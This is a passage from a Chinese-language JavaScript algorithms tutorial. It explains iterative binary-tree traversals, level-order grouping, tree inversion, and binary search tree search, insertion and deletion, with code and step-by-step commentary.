<p>大家可以尝试在大脑里预判一下这个代码的执行顺序：由于我们填充 <code>res</code> 结果数组的顺序是从后往前填充（每次增加一个头部元素），因此先出栈的结点反而会位于 <code>res</code> 数组相对靠后的位置。出栈的顺序是 <code>当前结点 -&gt; 当前结点的左孩子 -&gt; 当前结点的右孩子</code> ，其对应的 <code>res</code> 序列顺序就是 <code>右 -&gt; 左 -&gt; 根</code> 。这样一来， 根结点就成功地被我们转移到了遍历序列的最末尾。<br/>现在唯一让人看不顺眼的只剩下这个右孩子和左孩子的顺序了，这两个孩子结点进入结果数组的顺序与其被 <code>pop</code> 出栈的顺序是一致的，而出栈顺序又完全由入栈顺序决定，因此只需要相应地调整两个结点的入栈顺序就好了：  </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 若当前子树根结点有左孩子，则将左孩子入栈</span>
<span class="hljs-keyword">if</span>(cur.<span class="hljs-property">left</span>) {
  stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">left</span>)
}  
<span class="hljs-comment">// 若当前子树根结点有右孩子，则将右孩子入栈</span>
<span class="hljs-keyword">if</span>(cur.<span class="hljs-property">right</span>) {
  stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">right</span>)
}
</code></pre>
<p>如此一来，右孩子就会相对于左孩子优先出栈，进而被放在 <code>res</code> 结果数组相对靠后的位置， <code>左 -&gt; 右 -&gt;根</code> 的排序规则就稳稳地实现出来了。   <br/>  <br/>我们把以上两个改造点结合一下，就有了以下代码：   <br/></p>
<p><a name="user-content-Yy3lw" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-57">编码实现   </h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} <span class="hljs-variable">root</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[]</span>}
 */</span>
<span class="hljs-keyword">const</span> postorderTraversal = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-comment">// 定义结果数组</span>
  <span class="hljs-keyword">const</span> res = []  
  <span class="hljs-comment">// 处理边界条件</span>
  <span class="hljs-keyword">if</span>(!root) {
      <span class="hljs-keyword">return</span> res
  }
  <span class="hljs-comment">// 初始化栈结构</span>
  <span class="hljs-keyword">const</span> stack = [] 
  <span class="hljs-comment">// 首先将根结点入栈</span>
  stack.<span class="hljs-title function_">push</span>(root)  
  <span class="hljs-comment">// 若栈不为空，则重复出栈、入栈操作</span>
  <span class="hljs-keyword">while</span>(stack.<span class="hljs-property">length</span>) {
      <span class="hljs-comment">// 将栈顶结点记为当前结点</span>
      <span class="hljs-keyword">const</span> cur = stack.<span class="hljs-title function_">pop</span>() 
      <span class="hljs-comment">// 当前结点就是当前子树的根结点，把这个结点放在结果数组的头部</span>
      res.<span class="hljs-title function_">unshift</span>(cur.<span class="hljs-property">val</span>)
      <span class="hljs-comment">// 若当前子树根结点有左孩子，则将左孩子入栈</span>
      <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">left</span>) {
        stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">left</span>)
      }  
      <span class="hljs-comment">// 若当前子树根结点有右孩子，则将右孩子入栈</span>
      <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">right</span>) {
        stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">right</span>)
      }
  }
  <span class="hljs-comment">// 返回结果数组</span>
  <span class="hljs-keyword">return</span> res
};
</code></pre>
<p><a name="user-content-3cD95" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-58"/>
<p><a name="user-content-ywiel" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-59">思路清奇的中序遍历迭代实现  </h3>
<p><a name="user-content-W7rLX" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-60">思路分析</h4>
<p>经过上面的讲解，大家会发现先序遍历和后序遍历的编码实现其实是非常相似的，它们遵循的都是同一套基本框架。那么我们能否通过对这个基本框架进行微调、从而同样轻松地实现中序遍历呢？   <br/>答案是不能，为啥不能？因为先序遍历和后序遍历之所以可以用同一套代码框架来实现，本质上是因为两者的出栈、入栈逻辑差别不大——都是先处理根结点，然后处理孩子结点。而中序遍历中，根结点不再出现在遍历序列的边界、而是出现在遍历序列的中间。这就意味着无论如何我们不能再将根结点作为第一个被 <code>pop</code> 出来的元素来处理了——出栈的时机被改变了，这意味着入栈的逻辑也需要调整。这一次我们不能再通过对 <code>res</code> 动手脚来解决问题，而是需要和 <code>stack</code> 面对面 battle。     <br/>  <br/>中序遍历的序列规则是 <code>左 -&gt; 中 -&gt; 右</code> ，这意味着我们必须首先定位到最左的叶子结点。在这个定位的过程中，必然会途径目标结点的父结点、爷爷结点和各种辈分的祖宗结点：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/10/171fefdfeae2b8a3~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=532&amp;h=362&amp;s=67269&amp;e=gif&amp;f=9" alt="" loading="lazy"/>  <br/> <br/>途径过的每一个结点，我们都要及时地把它入栈。这样当最左的叶子结点出栈时，第一个回溯到的就是它的父结点：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/10/171ff0373bbde5df~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=2082&amp;h=736&amp;s=88982&amp;e=jpg" alt="" loading="lazy"/>
有了父结点，就不愁找不到兄弟结点，遍历结果就变得唾手可得了~     <br/>基于这个思路，我们来写代码：   <a name="user-content-bQ6JB" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-61">编码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} <span class="hljs-variable">root</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[]</span>}
 */</span>
<span class="hljs-keyword">const</span> inorderTraversal = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-comment">// 定义结果数组</span>
  <span class="hljs-keyword">const</span> res = []  
  <span class="hljs-comment">// 初始化栈结构</span>
  <span class="hljs-keyword">const</span> stack = []   
  <span class="hljs-comment">// 用一个 cur 结点充当游标</span>
  <span class="hljs-keyword">let</span> cur = root  
  <span class="hljs-comment">// 当 cur 不为空、或者 stack 不为空时，重复以下逻辑</span>
  <span class="hljs-keyword">while</span>(cur || stack.<span class="hljs-property">length</span>) {
      <span class="hljs-comment">// 这个 while 的作用是把寻找最左叶子结点的过程中，途径的所有结点都记录下来 </span>
      <span class="hljs-keyword">while</span>(cur) {
          <span class="hljs-comment">// 将途径的结点入栈</span>
          stack.<span class="hljs-title function_">push</span>(cur)  
          <span class="hljs-comment">// 继续搜索当前结点的左孩子</span>
          cur = cur.<span class="hljs-property">left</span>  
      }
      <span class="hljs-comment">// 取出栈顶元素</span>
      cur = stack.<span class="hljs-title function_">pop</span>()  
      <span class="hljs-comment">// 将栈顶元素入栈</span>
      res.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">val</span>)  
      <span class="hljs-comment">// 尝试读取 cur 结点的右孩子</span>
      cur = cur.<span class="hljs-property">right</span>
  }
  <span class="hljs-comment">// 返回结果数组</span>
  <span class="hljs-keyword">return</span> res
};
</code></pre>
<p><a name="user-content-mgStm" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-62">编码复盘</h4>
<p>读完这段编码示范，一部分同学可能已经开始懵逼了：看着前面给出的思路分析，似乎完全写不出上面这样的代码啊！所以这段代码到底在干嘛？？？   <br/>如果你没有这样的困惑，说明你是一位悟性比较高的同学，可以直接跳过编码复盘部分往下读了（btw给你点个赞~）。   <br/>实不相瞒，如果你是初学者，这段代码可能确实需要大家在脑内反复运行、反复跑 demo 才能理解其中的逻辑。为了加快这个过程，我把其中看上去稍微拐弯抹角一点的逻辑摘出来，给大家点拨一下：  </p>
<ol>
<li>两个 <code>while</code> ：内层的 <code>while</code> 的作用是在寻找最左叶子结点的过程中，把途径的所有结点都记录到 <code>stack</code> 里。记录工作完成后，才会走到外层 <code>while</code> 的剩余逻辑里——这部分逻辑的作用是从最左的叶子结点开始，一层层回溯遍历左孩子的父结点和右侧兄弟结点，进而完成整个中序遍历任务。  </li>
<li>外层 <code>while</code> 的两个条件： <code>cur</code> 的存在性和<code>stack.length</code> 的存在性，各自是为了限制什么？
<ol>
<li><code>stack.length</code> 的存在性比较好理解， <code>stack</code> 中存储的是没有被推入结果数组 <code>res</code> 的待遍历元素。只要 <code>stack</code> 不为空，就意味着遍历没有结束， 遍历动作需要继续重复。 </li>
<li><code>cur</code> 的存在性就比较有趣了。它对应以下几种情况： 
<ol>
<li>初始态， <code>cur</code> 指向 <code>root</code> 结点，只要 <code>root</code> 不为空， <code>cur</code> 就不为空。此时判断了 <code>cur</code> 存在后，就会开始最左叶子结点的寻找之旅。这趟“一路向左”的旅途中， <code>cur</code> 始终指向当前遍历到的左孩子。 </li>
<li>第一波内层 <code>while</code> 循环结束， <code>cur</code> 开始承担中序遍历的遍历游标职责。 <code>cur</code> 始终会指向当前栈的栈顶元素，也就是“一路向左”过程中途径的某个左孩子，然后将这个左孩子作为中序遍历的第一个结果元素纳入结果数组。假如这个左孩子是一个叶子结点，那么尝试取其右孩子时就只能取到 <code>null</code> ，这个 <code>null</code> 的存在，会导致内层循环 <code>while</code> 被跳过，接着就直接回溯到了这个左孩子的父结点，符合 <code>左-&gt;根</code>  的序列规则  </li>
<li>假如当前取到的栈顶元素不是叶子结点，同时有一个右孩子，那么尝试取其右孩子时就会取到一个存在的结点。 <code>cur</code> 存在，于是进入内层 <code>while</code> 循环，重复“一路向左”的操作，去寻找这个右孩子对应的子树里最靠左的结点，然后去重复刚刚这个或回溯、或“一路向左”的过程。如果这个右孩子对应的子树里没有左孩子，那么跳出内层 <code>while</code> 循环之后，紧接着被纳入 <code>res</code> 结果数组的就是这个右孩子本身，符合 <code>根-&gt;右</code> 的序列规则</li>
</ol>
</li>
</ol>
</li>
</ol>
<p><br/>结合上面的分析，大家会不会觉得中序遍历迭代法的这一通操作非常奇妙呢？短短的几行代码，里面竟然藏着这么广阔的乾坤，牛x、牛x。   <br/>作为初学者，即便第一次写不出来上面的解法，也没什么好丧气的——大家谨记，关于二叉树的先、中、后序遍历，<strong>你对自己的要求应该是能够默写，也就是说要对上面这些逻辑充分熟悉、深刻记忆</strong>。   <br/>在熟悉和记忆的过程中，你会渐渐地对这些乍一看似乎很巧妙的操作产生一种“这也很自然嘛”的感觉，这种感觉就意味着你对这个思路的充分吸收。还是那句话，千万不要以为理解就是终点，你需要做的是记忆！记忆！理解是一种感觉，记忆却能保证你在做题时一秒钟映射到具体的套路和代码——只有靠自己的双手写出来的代码，才是最可靠的伙伴。  <br/> <br/></p>
<p><a name="user-content-6wFlT" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h2 data-id="heading-63">层序遍历的衍生问题    </h2>
<p>在 <code>DFS 和 BFS</code> 这一节，我们已经讲过了二叉树层序遍历的实现方法。层序遍历本本身难度不大，但一想到这是一个关键考点，出题这帮人就每天绞尽脑汁地想要把简单的问题复杂化。于是，就有了我们眼下这个命题方向——层序遍历的衍生问题。  <br/>对于这类问题，我们接下来会讲最有代表性的一道作为例题。各位只要能吃透这一道的基本思路，就能够轻松地在类似的变体中举一反三（例题请大家好好把握，在大厂真题训练环节，我会给出一道变体来检验各位的学习效果）。  <br/></p>
<blockquote>
<p>题目描述：给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p>
</blockquote>
<blockquote>
<p>示例：
二叉树：[3,9,20,null,null,15,7],</p>
</blockquote>
<pre><code class="hljs">  3
 / \
9  20
  /  \
 15   7
</code></pre>
<blockquote>
<p>返回其层次遍历结果：<br/>
[<br/>
[3],<br/>
[9,20],<br/>
[15,7]<br/>
]</p>
</blockquote>
<p><a name="user-content-h6Mdu" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-64">思路分析</h3>
<p>层序遍历没有那么多幺蛾子，大家看到层序遍历就应该条件反射出 <code>BFS+队列</code>  这对好基友。所谓变体，不过是在 <code>BFS</code> 的过程中围绕结果数组的内容做文章。   <br/>拿这道题来说，相对于我们 14 节中讲过的层序遍历基本思路，它变出的花样仅仅在于要求我们对层序遍历结果进行<strong>分层</strong>。也就是说只要我们能在 <code>BFS</code> 的过程中感知到当前层级、同时用不同的数组把不同的层级区分开，这道题就得解了。   <br/><br/>
如何做到这一点？大家需要知道一个非常重要的信息：我们在对二叉树进行层序遍历时，每一次 <code>while</code> 循环其实都对应着二叉树的某一层。只要我们在进入<code>while</code>循环之初，记录下这一层结点个数，然后将这个数量范围内的元素 <code>push</code> 进同一个数组，就能够实现二叉树的分层。</p>
<p><a name="user-content-KEHOh" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-65">编码实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} <span class="hljs-variable">root</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[][]</span>}
 */</span>
<span class="hljs-keyword">const</span> levelOrder = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-comment">// 初始化结果数组</span>
    <span class="hljs-keyword">const</span> res = []  
    <span class="hljs-comment">// 处理边界条件</span>
    <span class="hljs-keyword">if</span>(!root) {
        <span class="hljs-keyword">return</span> res
    }  
    <span class="hljs-comment">// 初始化队列</span>
    <span class="hljs-keyword">const</span> queue = []   
    <span class="hljs-comment">// 队列第一个元素是根结点</span>
    queue.<span class="hljs-title function_">push</span>(root)  
    <span class="hljs-comment">// 当队列不为空时，反复执行以下逻辑</span>
    <span class="hljs-keyword">while</span>(queue.<span class="hljs-property">length</span>) {
        <span class="hljs-comment">// level 用来存储当前层的结点</span>
        <span class="hljs-keyword">const</span> level = []  
        <span class="hljs-comment">// 缓存刚进入循环时的队列长度，这一步很关键，因为队列长度后面会发生改变</span>
        <span class="hljs-keyword">const</span> len = queue.<span class="hljs-property">length</span>  
        <span class="hljs-comment">// 循环遍历当前层级的结点</span>
        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;len;i++) {
            <span class="hljs-comment">// 取出队列的头部元素</span>
            <span class="hljs-keyword">const</span> top = queue.<span class="hljs-title function_">shift</span>()  
            <span class="hljs-comment">// 将头部元素的值推入 level 数组</span>
            level.<span class="hljs-title function_">push</span>(top.<span class="hljs-property">val</span>)
            <span class="hljs-comment">// 如果当前结点有左孩子，则推入下一层级</span>
            <span class="hljs-keyword">if</span>(top.<span class="hljs-property">left</span>) {
                queue.<span class="hljs-title function_">push</span>(top.<span class="hljs-property">left</span>)
            }
            <span class="hljs-comment">// 如果当前结点有右孩子，则推入下一层级</span>
            <span class="hljs-keyword">if</span>(top.<span class="hljs-property">right</span>) {
                queue.<span class="hljs-title function_">push</span>(top.<span class="hljs-property">right</span>)
            }
        }
        <span class="hljs-comment">// 将 level 推入结果数组</span>
        res.<span class="hljs-title function_">push</span>(level)
    }
    <span class="hljs-comment">// 返回结果数组</span>
    <span class="hljs-keyword">return</span> res
};
</code></pre>
<h2 data-id="heading-66">翻转二叉树</h2>
<p>翻转二叉树是一个非常经典的问题。之前有一个关于这道题的笑话，说是<code>Homebrew</code>的作者去面 Google，结果因为不会翻转二叉树被挂掉了。Google 在给这位大佬的拒信中写道：</p>
<blockquote>
<p>我们90％的工程师使用您编写的软件(Homebrew)，但是您却无法在面试时在白板上写出翻转二叉树这道题，这太糟糕了。</p>
</blockquote>
<p>这个故事之所以是个笑话，是因为翻转二叉树在算法面试中实在太常见了——只要你准备算法面试，你就不得不做这个题。在面试中做不出这道题的同学，会给面试官留下基础不牢的糟糕印象。</p>
<p>接下来我们就一起来搞定这道翻转二叉树，成为比<code>homebrew</code>作者更懂算法面试的人（逃</p>
<blockquote>
<p>题目描述：翻转一棵二叉树。</p>
</blockquote>
<blockquote>
<p>示例：<br/>
输入：</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">     4
   /   \
  2     7
 / \   / \
1   3 6   9
</span></code></pre>
<blockquote>
<p>输出：</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">     4
   /   \
  7     2
 / \   / \
9   6 3   1
</span></code></pre>
<h3 data-id="heading-67">思路分析</h3>
<p>这道题是一道非常经典的递归应用题。<br/>
一棵二叉树，经过翻转后会有什么特点？答案是每一棵子树的左孩子和右孩子都发生了交换。既然是“每一棵子树”，那么就意味着重复，既然涉及了重复，就没有理由不用递归。</p>
<p>于是这道题解题思路就非常明确了：以递归的方式，遍历树中的每一个结点，并将每一个结点的左右孩子进行交换。</p>
<h3 data-id="heading-68">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} <span class="hljs-variable">root</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode</span>}
 */</span>
<span class="hljs-keyword">const</span> invertTree = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-comment">// 定义递归边界</span>
    <span class="hljs-keyword">if</span>(!root) {
        <span class="hljs-keyword">return</span> root;
    }
    <span class="hljs-comment">// 递归交换右孩子的子结点</span>
    <span class="hljs-keyword">let</span> right = <span class="hljs-title function_">invertTree</span>(root.<span class="hljs-property">right</span>);
    <span class="hljs-comment">// 递归交换左孩子的子结点</span>
    <span class="hljs-keyword">let</span> left = <span class="hljs-title function_">invertTree</span>(root.<span class="hljs-property">left</span>);
    <span class="hljs-comment">// 交换当前遍历到的两个左右孩子结点</span>
    root.<span class="hljs-property">left</span> = right;
    root.<span class="hljs-property">right</span> = left;
    <span class="hljs-keyword">return</span> root;
};
</code></pre>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）
二叉搜索树（Binary Search Tree）简称 BST，是二叉树的一种特殊形式。它有很多别名，比如排序二叉树、二叉查找树等等。</p>
<p>虽然二叉搜索树多年来一直作为算法面试的“必要考点”存在，但在实际面试中，它的考察频率并不能和常规二叉树相提并论，算不上“大热”的考点，同时考察内容也是相对比较稳定的。对于二叉搜索树，我们只要能够把握好它的限制条件和特性，就足以应对大部分的考题。</p>
<h2 data-id="heading-69">什么是二叉搜索树</h2>
<p>树的定义总是以递归的形式出现，二叉搜索树也不例外，它的递归定义如下：</p>
<ol>
<li>是一棵空树</li>
<li>是一棵由根结点、左子树、右子树组成的树，同时左子树和右子树都是二叉搜索树，且<strong>左子树</strong>上所有结点的数据域都<strong>小于等于</strong>根结点的数据域，<strong>右子树</strong>上所有结点的数据域都<strong>大于等于</strong>根结点的数据域</li>
</ol>
<p>满足以上两个条件之一的二叉树，就是二叉搜索树。</p>
<p>从这个定义我们可以看出，二叉搜索树强调的是<strong>数据域的有序性</strong>。也就是说，二叉搜索树上的每一棵子树，都应该满足 <code>左孩子 &lt;= 根结点 &lt;= 右孩子</code> 这样的大小关系。下图我给出了几个二叉搜索树的示例：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/81507c52878942b08f5f5a781ee8944c~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1944&amp;h=748&amp;s=89014&amp;e=jpg&amp;b=ffffff" alt="" loading="lazy"/>
以第三棵树为例，根结点的数据域为6，它的左子树的所有结点都小于等于6、右子树的所有结点都大于等于6。同时在任意子树的内部，也满足这个条件——比如左子树中，根结点值为3，根结点对应左子树的所有结点都小于等于3、右子树的所有结点都大于等于3。</p>
<h2 data-id="heading-70">二叉搜索树：编码基本功</h2>
<p>关于二叉搜索树，大家需要掌握以下高频操作：</p>
<ol>
<li>查找数据域为某一特定值的结点</li>
<li>插入新结点</li>
<li>删除指定结点</li>
</ol>
<h3 data-id="heading-71">查找数据域为某一特定值的结点</h3>
<p>假设这个目标结点的数据域值为 <code>n</code>，我们借助二叉搜索树数据域的有序性，可以有以下查找思路：</p>
<ol>
<li>递归遍历二叉树，若当前遍历到的结点为空，就意味着没找到目标结点，直接返回。</li>
<li>若当前遍历到的结点对应的数据域值刚好等于<code>n</code>，则查找成功，返回。</li>
<li>若当前遍历到的结点对应的数据域值大于目标值<code>n</code>，则应该在左子树里进一步查找，设置下一步的遍历范围为 <code>root.left</code> 后，继续递归。</li>
<li>若当前遍历到的结点对应的数据域值小于目标值<code>n</code>，则应该在右子树里进一步查找，设置下一步的遍历范围为 <code>root.right</code> 后，继续递归。</li>
</ol>
<h4 data-id="heading-72">编码实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">root, n</span>) {
    <span class="hljs-comment">// 若 root 为空，查找失败，直接返回</span>
    <span class="hljs-keyword">if</span>(!root) {
        <span class="hljs-keyword">return</span> 
    }
    <span class="hljs-comment">// 找到目标结点，输出结点对象</span>
    <span class="hljs-keyword">if</span>(root.<span class="hljs-property">val</span> === n) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'目标结点是：'</span>, root)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root.<span class="hljs-property">val</span> &gt; n) {
        <span class="hljs-comment">// 当前结点数据域大于n，向左查找</span>
        <span class="hljs-title function_">search</span>(root.<span class="hljs-property">left</span>, n)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 当前结点数据域小于n，向右查找</span>
        <span class="hljs-title function_">search</span>(root.<span class="hljs-property">right</span>, n)
    }
}
</code></pre>
<h3 data-id="heading-73">插入新结点</h3>
<p>插入结点的思路其实和寻找结点非常相似。大家反思一下，在上面寻找结点的时候，为什么我们会在判定当前结点为空时，就认为查找失败了呢？<br/>
这是因为，二叉搜索树的查找路线是一个非常<strong>明确</strong>的路径：我们会根据当前结点值的大小，决定路线应该是向左走还是向右走。如果最后走到了一个空结点处，这就意味着我们没有办法再往深处去搜索了，也就没有了找到目标结点的可能性。</p>
<p>换一个角度想想，如果这个空结点所在的位置恰好有一个值为 <code>n</code> 的结点，是不是就可以查找成功了？那么如果我把 <code>n</code> 值塞到这个空结点所在的位置，是不是刚好符合二叉搜索树的排序规则？</p>
<p>实不相瞒，二叉搜索树插入结点的过程，和搜索某个结点的过程几乎是一样的：从根结点开始，把我们希望插入的数据值和每一个结点作比较。若大于当前结点，则向右子树探索；若小于当前结点，则向左子树探索。最后找到的那个空位，就是它合理的栖身之所。</p>
<h4 data-id="heading-74">编码实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">insertIntoBST</span>(<span class="hljs-params">root, n</span>) {
    <span class="hljs-comment">// 若 root 为空，说明当前是一个可以插入的空位</span>
    <span class="hljs-keyword">if</span>(!root) { 
        <span class="hljs-comment">// 用一个值为n的结点占据这个空位</span>
        root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(n)
        <span class="hljs-keyword">return</span> root
    }
    
    <span class="hljs-keyword">if</span>(root.<span class="hljs-property">val</span> &gt; n) {
        <span class="hljs-comment">// 当前结点数据域大于n，向左查找</span>
        root.<span class="hljs-property">left</span> = <span class="hljs-title function_">insertIntoBST</span>(root.<span class="hljs-property">left</span>, n)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 当前结点数据域小于n，向右查找</span>
        root.<span class="hljs-property">right</span> = <span class="hljs-title function_">insertIntoBST</span>(root.<span class="hljs-property">right</span>, n)
    }

    <span class="hljs-comment">// 返回插入后二叉搜索树的根结点</span>
    <span class="hljs-keyword">return</span> root
}
</code></pre>
<p>注：你可以用<a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode-cn.com%2Fproblems%2Finsert-into-a-binary-search-tree%2F" target="_blank" title="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/" ref="nofollow noopener noreferrer">这道力扣真题</a>  来验证以上插入操作的正确性。</p>
<h3 data-id="heading-75">删除指定结点</h3>
<p>想要删除某个结点，首先要找到这个结点。在定位结点后，我们需要考虑以下情况：</p>
<ol>
<li>结点不存在，定位到了空结点。直接返回即可。</li>
<li>需要删除的目标结点没有左孩子也没有右孩子——它是一个叶子结点，删掉它不会对其它结点造成任何影响，直接删除即可。</li>
<li>需要删除的目标结点存在左子树，那么就去左子树里寻找小于目标结点值的最大结点，用这个结点覆盖掉目标结点</li>
<li>需要删除的目标结点存在右子树，那么就去右子树里寻找大于目标结点值的最小结点，用这个结点覆盖掉目标结点</li>
<li>需要删除的目标结点既有左子树、又有右子树，这时就有两种做法了：要么取左子树中值最大的结点，要么取右子树中取值最小的结点。两个结点中任取一个覆盖掉目标结点，都可以维持二叉搜索树的数据有序性</li>
</ol>
<h4 data-id="heading-76">编码实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteNode</span>(<span class="hljs-params">root, n</span>) {
    <span class="hljs-comment">// 如果没找到目标结点，则直接返回</span>
    <span class="hljs-keyword">if</span>(!root) {
        <span class="hljs-keyword">return</span> root
    }
    <span class="hljs-comment">// 定位到目标结点，开始分情况处理删除动作</span>
    <span class="hljs-keyword">if</span>(root.<span class="hljs-property">val</span> === n) {
        <span class="hljs-comment">// 若是叶子结点，则不需要想太多，直接删除</span>
        <span class="hljs-keyword">if</span>(!root.<span class="hljs-property">left</span> &amp;&amp; !root.<span class="hljs-property">right</span>) {
            root = <span class="hljs-literal">null</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root.<span class="hljs-property">left</span>) {
            <span class="hljs-comment">// 寻找左子树里值最大的结点</span>
            <span class="hljs-keyword">const</span> maxLeft = <span class="hljs-title function_">findMax</span>(root.<span class="hljs-property">left</span>)
            <span class="hljs-comment">// 用这个 maxLeft 覆盖掉需要删除的当前结点  </span>
            root.<span class="hljs-property">val</span> = maxLeft.<span class="hljs-property">val</span>
            <span class="hljs-comment">// 覆盖动作会消耗掉原有的 maxLeft 结点</span>
            root.<span class="hljs-property">left</span> = <span class="hljs-title function_">deleteNode</span>(root.<span class="hljs-property">left</span>, maxLeft.<span class="hljs-property">val</span>)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 寻找右子树里值最小的结点</span>
            <span class="hljs-keyword">const</span> minRight = <span class="hljs-title function_">findMin</span>(root.<span class="hljs-property">right</span>)
            <span class="hljs-comment">// 用这个 minRight 覆盖掉需要删除的当前结点  </span>
            root.<span class="hljs-property">val</span> = minRight.<span class="hljs-property">val</span>
            <span class="hljs-comment">// 覆盖动作会消耗掉原有的 minRight 结点</span>
            root.<span class="hljs-property">right</span> = <span class="hljs-title function_">deleteNode</span>(root.<span class="hljs-property">right</span>, minRight.<span class="hljs-property">val</span>)
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root.<span class="hljs-property">val</span> &gt; n) {
        <span class="hljs-comment">// 若当前结点的值比 n 大，则在左子树中继续寻找目标结点</span>
        root.<span class="hljs-property">left</span> = <span class="hljs-title function_">deleteNode</span>(root.<span class="hljs-property">left</span>, n)
    } <span class="hljs-keyword">else</span>  {
        <span class="hljs-comment">// 若当前结点的值比 n 小，则在右子树中继续寻找目标结点</span>
        root.<span class="hljs-property">right</span> = <span class="hljs-title function_">deleteNode</span>(root.<span class="hljs-property">right</span>, n)
    }
    <span class="hljs-keyword">return</span> root
}

<span class="hljs-comment">// 寻找左子树最大值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">findMax</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">while</span>(root.<span class="hljs-property">right</span>) {
        root = root.<span class="hljs-property">right</span>
    }
    <span class="hljs-keyword">return</span> root 
}

<span class="hljs-comment">// 寻找右子树的最小值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">findMin</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">while</span>(root.<span class="hljs-property">left</span>) {
        root = root.<span class="hljs-property">left</span>
    }
    <span class="hljs-keyword">return</span> root
}
</code></pre>
<p>你可以在<a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode-cn.com%2Fproblems%2Fdelete-node-in-a-bst%2Fsubmissions%2F" target="_blank" title="https://leetcode-cn.com/problems/delete-node-in-a-bst/submissions/" ref="nofollow noopener noreferrer">这道力扣真题</a>中验证以上删除操作代码的正确性。</p>
<h4 data-id="heading-77">编码复盘</h4>
<p>上面这段代码展示了二叉搜索树删除的基本思路：在这个思路的基础上，大家可以做很多个性化的修改。<br/>
举个例子，细心的同学会发现，如果目标结点既有左子树又有右子树，那么在上面这段逻辑里，会优先去找它左子树里的最大值，而不会去 care 右子树的最小值这个选项。<br/>
这样做，得到的结果从正确性上来说是没问题的，但是却不太美观：每次都删除一侧子树的结点，会导致二叉树的左右子树高度不平衡。<br/>
如果题目中要求我们顾及二叉树的平衡度，那么我们就可以在删除的过程中记录子树的高度，每次选择高度较高的子树作为查找目标，用这个子树里的结点去覆盖需要删除的目标结点。<br/>
